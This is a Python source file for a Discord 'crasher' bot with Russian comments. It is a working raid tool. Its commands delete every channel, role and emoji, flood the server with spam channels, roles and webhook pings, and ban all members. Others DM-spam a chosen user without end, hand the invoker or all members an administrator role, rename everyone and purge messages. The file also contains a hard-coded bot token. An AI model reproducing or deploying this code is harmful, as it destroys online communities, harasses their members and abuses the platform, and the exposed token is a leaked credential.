# -*- coding: utf8 -*-
import discord
import asyncio
from discord.ext import commands
from discord.utils import get


bot = commands.Bot(command_prefix='.', intents=discord.Intents.all())
bot.remove_command("help")

TOKEN = 'MTE3MDM4NjgzNDg0OTgxMjU5MQ.GrUZ_V.sp8Ux3fiU-wEbT27A_C_-KsX8F_-POypXnBpqo'


@bot.event
async def on_ready():
    print(f"Я трахну сервера на своем ПЕНИСЕЕЕЕЕЕ")
    print(bot.user, bot.user.id)


##################################################################################
#                              КРАШ КОМАНДЫ                                      #
##################################################################################


async def template(ctx: commands.context.Context):
    try:
        bebrus = await ctx.guild.templates()
        for template in bebrus:
            await template.delete()
    except:
        pass

    temp = await ctx.guild.create_template(name="R.I.P SERVER",
                                    description=f"""Crashed Bords crasher""")

    while True:
        await temp.sync()
    


async def avatar(ctx):
    guild = ctx.message.guild
    with open('guildavatar.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name="Bords Crashed Server", icon=icon)


async def delchannel(ctx):
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except:
            continue


async def delemoji(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            continue


async def delrole(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            continue


async def spamch(ctx: commands.context.Context):
    for i in range(1, 100):
        channel = await ctx.guild.create_text_channel("bords-crashed-server")
        asyncio.create_task(spamth(channel))
        asyncio.create_task(spamhook(channel))
    for i in range(1, 100):
        await ctx.guild.create_voice_channel("Bords Crashed Server")


async def spamrl(ctx):
    for i in range(1, 100):
        await ctx.guild.create_role(name="Bords Crashed Server", color=0xbd0909)


async def spamth(channel: discord.TextChannel):
    while True:
        emb = discord.Embed(title="Server Crashed)",
                                  description=f"""Hello server cras.. чё я строю из себя англичана крч сервер крашнут Bords ботом""", color=0xbd0909)

        emb.set_image(url="https://i.imgur.com/9eVu1RT.gif")

        await channel.send(embed=emb, content="@everyone @here")

async def spamhook(channel: discord.TextChannel):
    for i in range(5):
        await channel.create_webhook(name="Bords Crashed Server")

    while True:
        h = await channel.webhooks()
        for f in h:
            emb = discord.Embed(title="Server Crashed",
                                        description=f"""Hello server cras.. чё я строю из себя англичана крч сервер крашнут Bords ботом""", color=0xbd0909)

            emb.set_image(url="https://i.imgur.com/9eVu1RT.gif")

            await f.send(embed=emb, content="@everyone @here @everyone")


async def emoji(ctx):
    try:
         for i in range(200):
             with open("guildavatar.jpg", "rb") as img:
                 img_byte = img.read()
                 await ctx.guild.create_custom_emoji(name="Bords", image=img_byte)
    except:
        pass


@bot.command()
async def system(ctx):
    asyncio.create_task(delchannel(ctx))
    asyncio.create_task(delemoji(ctx))
    asyncio.create_task(delrole(ctx))
    asyncio.create_task(spamch(ctx))
    asyncio.create_task(avatar(ctx))
    asyncio.create_task(emoji(ctx))
    asyncio.create_task(spamrl(ctx))
    asyncio.create_task(template(ctx))


# спам в лс
@bot.command()
async def spam_ls(ctx, member: discord.Member):
    await ctx.message.delete()
    while True:
        try:
            emb = discord.Embed(title="Server Crashed",
                                description=f"""Hello server cras.. чё я строю из себя англичана крч сервер крашнут Bords ботом""", color=0xbd0909)
            emb.set_image(url="https://i.imgur.com/9eVu1RT.gif")

            await member.send(embed=emb, content="@everyone @here")
        except:
            continue


@bot.command()
async def info(ctx):
    await ctx.message.delete()
    bebrus = await ctx.guild.templates()
    for template in bebrus:
        await template.delete()

    temp = await ctx.guild.create_template(name=f"Шаблон помойки {ctx.guild}")

    emb = discord.Embed(description=f"""**Инфа помойки {ctx.guild}**

`ID:` {ctx.guild.id}
`Участников:` {len(ctx.guild.members)}
`Ролей:` {len(ctx.guild.roles)}
`Каналов:` {len(ctx.guild.channels)}
`Эмоджи:` {len(ctx.guild.emojis)}

`Создатель:` {ctx.guild.owner}
`Регион:` {ctx.guild.region}
`Дата создания:` {ctx.guild.created_at}
`Шаблон:` https://discord.new/{temp.code}

`Иконка гильдии:`""", color=0xbd0909)

    emb.set_image(url=f"{ctx.guild.icon_url}")

    await ctx.author.send(embed=emb)


@bot.command()
async def spam(ctx, *, arg):
    await ctx.message.delete()
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send(arg)
      except:
        continue


@bot.command()
async def channels(ctx, *, arg, m=200):
    print(f"Начался краш сервера: {ctx.guild}")
    await ctx.message.delete()
    for channel in ctx.guild.channels:  # собираем
        await channel.delete(reason="По просьбе")  # удаляем
    guild = ctx.message.guild
    c = 0
    while c < int(m):
        await guild.create_text_channel(arg)
        c += 1


@bot.command(pass_context=True)  # разрешаем передавать агрументы
async def hack(ctx, arg="Bords"):  # создаем асинхронную фунцию бота
    await ctx.message.delete()
    guild = ctx.guild
    perms = discord.Permissions(administrator=True)  # права роли
    await guild.create_role(name=arg, permissions=perms)  # создаем роль

    role = get(ctx.guild.roles, name=arg)  # находим роль по имени
    user = ctx.message.author
    await user.add_roles(role)  # выдаем роль


@bot.command()  # пишет в лс пользователю
async def help(ctx, typer=None):
    await ctx.message.delete()
    emb = discord.Embed(title="Вот весь мой арсенал 😈", description=f"""
`{bot.command_prefix}system` - **Подсистема сервера**

`{bot.command_prefix}ch` - **Очищение сообщений**

`{bot.command_prefix}jo` - **soon...)**


**__Команды помощи:__**

`{bot.command_prefix}help` - **Выводин это меню в лс**

`{bot.command_prefix}info` - **Информацию о сервере в лс**""", color=0xbd0909)

    emb.set_image(url="https://pm1.narvii.com/6543/2c7afd200e437177deadf655bcff1b1a20eedf2b_00.jpg")

    if typer == None:
        await ctx.author.send(embed=emb)
    elif typer == "chat":
        await ctx.send(embed=emb)


@bot.command()
async def roles(ctx, *, arg, m=200):
    await ctx.message.delete()
    for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                continue
    for role in range(m):
        try:
            await ctx.guild.create_role(name=arg)
        except:
            continue


@bot.command()
async def rainbowname(ctx, *, arg):
  try:
    await ctx.guild.create_role(name=arg)
    role = get(ctx.guild.roles, name=arg)
    for member in ctx.guild.members:
        await member.add_roles(role)
    while True:
                await role.edit(color=discord.Color.red())
                await role.edit(color=discord.Color.orange())
                await role.edit(color=discord.Color.gold())
                await role.edit(color=discord.Color.green())
                await role.edit(color=discord.Color.blue())
                await role.edit(color=discord.Color.dark_blue())
                await role.edit(color=discord.Color.purple())
  except:
      pass


@bot.command()
async def giverole(ctx, role):
    await ctx.message.delete()
    rolegive = get(ctx.guild.roles, name=role)
    user = ctx.message.author
    await user.add_roles(rolegive)


@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    for g in bot.get_all_members():
        try:
            await g.ban(reason="По просьбе")  # баним
        except:
            pass


@bot.command()
async def allhack(ctx, arg="Bords"):
    await ctx.message.delete()
    try:
        perms = discord.Permissions(administrator=True)
        await ctx.guild.create_role(name=arg, permissions=perms)

        role = get(ctx.guild.roles, name=arg)
        for all in ctx.guild.members:
            await all.add_roles(role)
    except:
        pass


@bot.command()
async def guildname(ctx, *, arg):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.edit(name=arg)


@bot.command()
async def nick(ctx, *, arg="ስድፍግጅክድስፍግጅህድስፍግጅላስጅድፍክግህጅካስህድፍክጅህሳድክጅፍህሳድጅህፍግጅክህስድጅፍክግህጅድፍስህግጅክህድስፍግጅክህድስፍጅክግሂኡድስፍህትክጅህድስጅክፍግህልክድስፍጅትድሥድፍህፍግስድክፍግህክጅህስዳክጅርፍይጅካስህድሪኡዩኢአወይሳድክጅፍህጅክሳድፋስድፍጅክህጃስክድፍህጅካስድፍ"):
    await ctx.message.delete()
    nickname = arg
    for member in ctx.guild.members:
        try:
            await member.edit(nick=nickname)  # меняем ники
        except:
            pass


@bot.command()
async def ch(ctx, amount=1000000):
    await ctx.message.delete()
    for k in ctx.guild.channels:
       await k.purge(limit=amount)


bot.run(TOKEN)
